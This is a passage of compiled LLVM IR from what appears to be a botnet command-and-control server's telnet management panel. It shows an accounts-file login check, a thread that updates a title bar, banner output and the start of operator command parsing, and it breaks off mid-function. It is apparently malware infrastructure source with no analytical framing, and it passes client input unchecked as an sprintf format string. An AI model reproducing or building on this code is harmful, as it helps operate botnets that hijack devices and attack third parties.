  %10 = alloca [90000 x i8], align 16
  %11 = alloca [90000 x i8], align 16
  %12 = alloca [5000 x i8], align 16
  %13 = alloca [5000 x i8], align 16
  %14 = alloca [5000 x i8], align 16
  %15 = alloca [5000 x i8], align 16
  %16 = alloca [5000 x i8], align 16
  %17 = alloca [5000 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [100 x i8*], align 16
  %87 = alloca [50 x i8*], align 16
  %88 = alloca [100 x i8*], align 16
  %89 = alloca [100 x i8*], align 16
  %90 = alloca [100 x i8*], align 16
  %91 = alloca [50 x i8*], align 16
  %92 = ptrtoint i8* %0 to i64
  %93 = trunc i64 %92 to i32
  %94 = load volatile i32, i32* @managesConnected, align 4
  %95 = add nsw i32 %94, 1
  store volatile i32 %95, i32* @managesConnected, align 4
  %96 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %96, i8 0, i64 2048, i32 16, i1 false)
  %97 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %97, i8 0, i64 2048, i32 16, i1 false)
  %98 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %99 = tail call i32 @feof(%struct._IO_FILE* %98) #10
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %.lr.ph308.preheader, label %._crit_edge309.thread

.lr.ph308.preheader:                              ; preds = %1
  br label %.lr.ph308

._crit_edge309.thread:                            ; preds = %1
  tail call void @rewind(%struct._IO_FILE* %98)
  br label %.lr.ph305.preheader

.lr.ph308:                                        ; preds = %.lr.ph308.preheader, %.lr.ph308
  %.0206306 = phi i32 [ %102, %.lr.ph308 ], [ 0, %.lr.ph308.preheader ]
  %101 = tail call i32 @fgetc(%struct._IO_FILE* %98)
  %102 = add nuw nsw i32 %.0206306, 1
  %103 = tail call i32 @feof(%struct._IO_FILE* %98) #10
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %.lr.ph308, label %._crit_edge309

._crit_edge309:                                   ; preds = %.lr.ph308
  tail call void @rewind(%struct._IO_FILE* %98)
  %105 = icmp eq i32 %.0206306, 0
  br i1 %105, label %._crit_edge, label %.lr.ph305.preheader

.lr.ph305.preheader:                              ; preds = %._crit_edge309.thread, %._crit_edge309
  %106 = phi i32 [ -1, %._crit_edge309.thread ], [ %.0206306, %._crit_edge309 ]
  %wide.trip.count = zext i32 %106 to i64
  br label %.lr.ph305

.lr.ph305:                                        ; preds = %.lr.ph305.preheader, %.lr.ph305
  %indvars.iv = phi i64 [ 0, %.lr.ph305.preheader ], [ %indvars.iv.next, %.lr.ph305 ]
  %107 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv, i32 0, i64 0
  %108 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv, i32 1, i64 0
  %109 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv, i32 2, i64 0
  %110 = tail call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %98, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i64 0, i64 0), i8* %107, i8* %108, i8* %109) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph305

._crit_edge.loopexit:                             ; preds = %.lr.ph305
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge309
  store i8 0, i8* %97, align 16
  %111 = call i64 @strlen(i8* nonnull %97) #9
  %112 = call i64 @send(i32 %93, i8* nonnull %97, i64 %111, i32 16384) #10
  %113 = icmp eq i64 %112, -1
  br i1 %113, label %.loopexit, label %114

; <label>:114:                                    ; preds = %._crit_edge
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i64 0, i64 0), i64 32, i32 1, i1 false)
  %115 = call i64 @strlen(i8* nonnull %97) #9
  %116 = call i64 @send(i32 %93, i8* nonnull %97, i64 %115, i32 16384) #10
  %117 = icmp eq i64 %116, -1
  br i1 %117, label %.loopexit, label %118

; <label>:118:                                    ; preds = %114
  %119 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %.loopexit, label %121

; <label>:121:                                    ; preds = %118
  call void @trim(i8* nonnull %96)
  %122 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %123 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %122, i8* nonnull %96) #10
  %124 = call i32 @Search_in_File(i8* nonnull %96)
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %125, i32 0, i64 0
  %127 = call i32 @strcmp(i8* nonnull %96, i8* %126) #9
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %231

; <label>:129:                                    ; preds = %121
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i64 0, i64 0), i64 32, i32 1, i1 false)
  %130 = call i64 @strlen(i8* nonnull %97) #9
  %131 = call i64 @send(i32 %93, i8* nonnull %97, i64 %130, i32 16384) #10
  %132 = icmp eq i64 %131, -1
  br i1 %132, label %.loopexit, label %133

; <label>:133:                                    ; preds = %129
  %134 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %.loopexit, label %136

; <label>:136:                                    ; preds = %133
  call void @trim(i8* nonnull %96)
  %137 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %125, i32 1, i64 0
  %138 = call i32 @strcmp(i8* nonnull %96, i8* %137) #9
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %140, label %231

; <label>:140:                                    ; preds = %136
  call void @llvm.memset.p0i8.i64(i8* nonnull %96, i8 0, i64 2048, i32 16, i1 false)
  %141 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %142 = call i64 @send(i32 %93, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i64 14, i32 16384) #10
  %143 = icmp eq i64 %142, -1
  br i1 %143, label %.loopexit, label %.lr.ph297

.lr.ph297:                                        ; preds = %140
  %144 = getelementptr inbounds [90000 x i8], [90000 x i8]* %9, i64 0, i64 0
  %145 = getelementptr inbounds [90000 x i8], [90000 x i8]* %10, i64 0, i64 0
  %146 = getelementptr inbounds [90000 x i8], [90000 x i8]* %11, i64 0, i64 0
  %sext208 = shl i64 %92, 32
  %147 = ashr exact i64 %sext208, 32
  %148 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %147, i32 1
  %149 = bitcast [50 x i8*]* %91 to i8*
  %150 = getelementptr inbounds [100 x i8*], [100 x i8*]* %88, i64 0, i64 0
  %151 = getelementptr inbounds [100 x i8*], [100 x i8*]* %89, i64 0, i64 0
  %152 = getelementptr inbounds [100 x i8*], [100 x i8*]* %90, i64 0, i64 0
  %153 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %125, i32 2, i64 0
  %154 = bitcast [50 x i8*]* %87 to i8*
  %155 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %125, i32 2, i64 0
  %156 = getelementptr inbounds [100 x i8*], [100 x i8*]* %86, i64 0, i64 0
  %157 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i64 0, i64 0
  %158 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i64 0, i64 0
  %159 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i64 0, i64 0
  %160 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i64 0, i64 0
  %161 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i64 0, i64 0
  %162 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i64 0, i64 0
  %163 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i64 0, i64 0
  %164 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i64 0, i64 0
  %165 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %166 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %167 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %168 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i64 0, i64 0
  %169 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i64 0, i64 0
  %170 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i64 0, i64 0
  %171 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i64 0, i64 0
  %172 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i64 0, i64 0
  %173 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i64 0, i64 0
  %174 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i64 0, i64 0
  %175 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i64 0, i64 0
  %176 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i64 0, i64 0
  %177 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i64 0, i64 0
  %178 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i64 0, i64 0
  %179 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i64 0, i64 0
  %180 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i64 0, i64 0
  %181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i64 0, i64 0
  %182 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i64 0, i64 0
  %183 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i64 0, i64 0
  %184 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i64 0, i64 0
  %185 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i64 0, i64 0
  %186 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i64 0, i64 0
  %187 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i64 0, i64 0
  %188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %189 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i64 0, i64 0
  %190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %191 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %192 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %193 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %195 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %197 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %199 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %200 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %201 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %208 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %209 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %210 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %212 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %216 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %217 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %218 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %219 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %220 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  %221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %13, i64 0, i64 0
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %14, i64 0, i64 0
  %223 = getelementptr inbounds [5000 x i8], [5000 x i8]* %15, i64 0, i64 0
  %224 = getelementptr inbounds [5000 x i8], [5000 x i8]* %16, i64 0, i64 0
  %225 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %227 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %228 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  br label %254

; <label>:231:                                    ; preds = %136, %121
  %232 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %233 = getelementptr inbounds [5000 x i8], [5000 x i8]* %8, i64 0, i64 0
  %234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %8, i64 0, i64 11
  call void @llvm.memset.p0i8.i64(i8* %234, i8 0, i64 2037, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %233, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i64 0, i64 0), i64 11, i32 1, i1 false)
  %235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %235, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.22, i64 0, i64 0), i64 23, i32 1, i1 false)
  %236 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %236, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i64 0, i64 0), i64 56, i32 1, i1 false)
  %237 = call i32 @sleep(i32 1) #10
  %238 = call i64 @strlen(i8* nonnull %233) #9
  %239 = call i64 @send(i32 %93, i8* nonnull %233, i64 %238, i32 16384) #10
  %240 = icmp eq i64 %239, -1
  br i1 %240, label %.loopexit, label %241

; <label>:241:                                    ; preds = %231
  %242 = call i64 @strlen(i8* nonnull %235) #9
  %243 = call i64 @send(i32 %93, i8* nonnull %235, i64 %242, i32 16384) #10
  %244 = icmp eq i64 %243, -1
  br i1 %244, label %.loopexit, label %245

; <label>:245:                                    ; preds = %241
  %246 = call i64 @strlen(i8* nonnull %236) #9
  %247 = call i64 @send(i32 %93, i8* nonnull %236, i64 %246, i32 16384) #10
  %248 = icmp eq i64 %247, -1
  br i1 %248, label %.loopexit, label %249

; <label>:249:                                    ; preds = %245
  %250 = call i32 @sleep(i32 7) #10
  br label %.loopexit

.loopexit210:                                     ; preds = %1006, %1009, %1012, %1015
  %251 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %252 = call i64 @send(i32 %93, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i64 14, i32 16384) #10
  %253 = icmp eq i64 %252, -1
  br i1 %253, label %.loopexit.loopexit313, label %254

; <label>:254:                                    ; preds = %.lr.ph297, %.loopexit210
  %255 = call i64 @send(i32 %93, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i64 0, i64 0), i64 2, i32 16384) #10
  %256 = icmp eq i64 %255, -1
  br i1 %256, label %.loopexit.loopexit313, label %257

; <label>:257:                                    ; preds = %254
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %144, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.26, i64 0, i64 0), i64 49, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %145, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.27, i64 0, i64 0), i64 71, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %146, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.28, i64 0, i64 0), i64 56, i32 1, i1 false)
  %258 = call i64 @send(i32 %93, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i64 14, i32 16384) #10
  %259 = icmp eq i64 %258, -1
  br i1 %259, label %.loopexit.loopexit313, label %260

; <label>:260:                                    ; preds = %257
  %261 = call i64 @strlen(i8* nonnull %144) #9
  %262 = call i64 @send(i32 %93, i8* nonnull %144, i64 %261, i32 16384) #10
  %263 = icmp eq i64 %262, -1
  br i1 %263, label %.loopexit.loopexit313, label %264

; <label>:264:                                    ; preds = %260
  %265 = call i64 @strlen(i8* nonnull %145) #9
  %266 = call i64 @send(i32 %93, i8* nonnull %145, i64 %265, i32 16384) #10
  %267 = icmp eq i64 %266, -1
  br i1 %267, label %.loopexit.loopexit313, label %268

; <label>:268:                                    ; preds = %264
  %269 = call i64 @strlen(i8* nonnull %146) #9
  %270 = call i64 @send(i32 %93, i8* nonnull %146, i64 %269, i32 16384) #10
  %271 = icmp eq i64 %270, -1
  br i1 %271, label %.loopexit.loopexit313, label %272

; <label>:272:                                    ; preds = %268
  %273 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %274 = call i64 @strlen(i8* nonnull %97) #9
  %275 = call i64 @send(i32 %93, i8* nonnull %97, i64 %274, i32 16384) #10
  %276 = icmp eq i64 %275, -1
  br i1 %276, label %.loopexit.loopexit313, label %277

; <label>:277:                                    ; preds = %272
  %278 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  store i32 1, i32* %148, align 4
  %279 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %280 = icmp sgt i32 %279, 0
  br i1 %280, label %.lr.ph.preheader, label %.loopexit.loopexit313

.lr.ph.preheader:                                 ; preds = %277
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %281 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #9
  %282 = icmp eq i8* %281, null
  br i1 %282, label %283, label %292

; <label>:283:                                    ; preds = %.lr.ph
  %284 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i64 0, i64 0)) #9
  %285 = icmp eq i8* %284, null
  br i1 %285, label %286, label %292

; <label>:286:                                    ; preds = %283
  %287 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #9
  %288 = icmp eq i8* %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0)) #9
  %291 = icmp eq i8* %290, null
  br i1 %291, label %298, label %292

; <label>:292:                                    ; preds = %289, %286, %283, %.lr.ph
  %293 = call i32 @clientsConnected()
  %294 = load volatile i32, i32* @managesConnected, align 4
  %295 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i64 0, i64 0), i32 %293, i32 %294) #10
  %296 = call i64 @strlen(i8* nonnull %97) #9
  %297 = call i64 @send(i32 %93, i8* nonnull %97, i64 %296, i32 16384) #10
  br label %298

; <label>:298:                                    ; preds = %289, %292
  %299 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i64 0, i64 0)) #9
  %300 = icmp eq i8* %299, null
  br i1 %300, label %301, label %307

; <label>:301:                                    ; preds = %298
  %302 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #9
  %303 = icmp eq i8* %302, null
  br i1 %303, label %304, label %307

; <label>:304:                                    ; preds = %301
  %305 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0)) #9
  %306 = icmp eq i8* %305, null
  br i1 %306, label %357, label %307

; <label>:307:                                    ; preds = %304, %301, %298
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %220, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i64 0, i64 0), i64 68, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %221, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %222, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %223, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %224, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %225, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %226, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %227, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i64 0, i64 0), i64 54, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %228, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %229, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %230, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %308 = call i64 @strlen(i8* nonnull %220) #9
  %309 = call i64 @send(i32 %93, i8* nonnull %220, i64 %308, i32 16384) #10
  %310 = icmp eq i64 %309, -1
  br i1 %310, label %.loopexit.loopexit, label %311

; <label>:311:                                    ; preds = %307
  %312 = call i64 @strlen(i8* nonnull %221) #9
  %313 = call i64 @send(i32 %93, i8* nonnull %221, i64 %312, i32 16384) #10
  %314 = icmp eq i64 %313, -1
  br i1 %314, label %.loopexit.loopexit, label %315

; <label>:315:                                    ; preds = %311
  %316 = call i64 @strlen(i8* nonnull %222) #9
  %317 = call i64 @send(i32 %93, i8* nonnull %222, i64 %316, i32 16384) #10
  %318 = icmp eq i64 %317, -1
  br i1 %318, label %.loopexit.loopexit, label %319

; <label>:319:                                    ; preds = %315
  %320 = call i64 @strlen(i8* nonnull %223) #9
  %321 = call i64 @send(i32 %93, i8* nonnull %223, i64 %320, i32 16384) #10
  %322 = icmp eq i64 %321, -1
  br i1 %322, label %.loopexit.loopexit, label %323

; <label>:323:                                    ; preds = %319
  %324 = call i64 @strlen(i8* nonnull %224) #9
  %325 = call i64 @send(i32 %93, i8* nonnull %224, i64 %324, i32 16384) #10
  %326 = icmp eq i64 %325, -1
  br i1 %326, label %.loopexit.loopexit, label %327

; <label>:327:                                    ; preds = %323
  %328 = call i64 @strlen(i8* nonnull %225) #9
  %329 = call i64 @send(i32 %93, i8* nonnull %225, i64 %328, i32 16384) #10
  %330 = icmp eq i64 %329, -1
  br i1 %330, label %.loopexit.loopexit, label %331

; <label>:331:                                    ; preds = %327
  %332 = call i64 @strlen(i8* nonnull %226) #9
  %333 = call i64 @send(i32 %93, i8* nonnull %226, i64 %332, i32 16384) #10
  %334 = icmp eq i64 %333, -1
  br i1 %334, label %.loopexit.loopexit, label %335

; <label>:335:                                    ; preds = %331
  %336 = call i64 @strlen(i8* nonnull %227) #9
  %337 = call i64 @send(i32 %93, i8* nonnull %227, i64 %336, i32 16384) #10
  %338 = icmp eq i64 %337, -1
  br i1 %338, label %.loopexit.loopexit, label %339

; <label>:339:                                    ; preds = %335
  %340 = call i64 @strlen(i8* nonnull %228) #9
  %341 = call i64 @send(i32 %93, i8* nonnull %228, i64 %340, i32 16384) #10
  %342 = icmp eq i64 %341, -1
  br i1 %342, label %.loopexit.loopexit, label %343

; <label>:343:                                    ; preds = %339
  %344 = call i64 @strlen(i8* nonnull %229) #9
  %345 = call i64 @send(i32 %93, i8* nonnull %229, i64 %344, i32 16384) #10
  %346 = icmp eq i64 %345, -1
  br i1 %346, label %.loopexit.loopexit, label %347

; <label>:347:                                    ; preds = %343
  %348 = call i64 @strlen(i8* nonnull %230) #9
  %349 = call i64 @send(i32 %93, i8* nonnull %230, i64 %348, i32 16384) #10
  %350 = icmp eq i64 %349, -1
  br i1 %350, label %.loopexit.loopexit, label %351

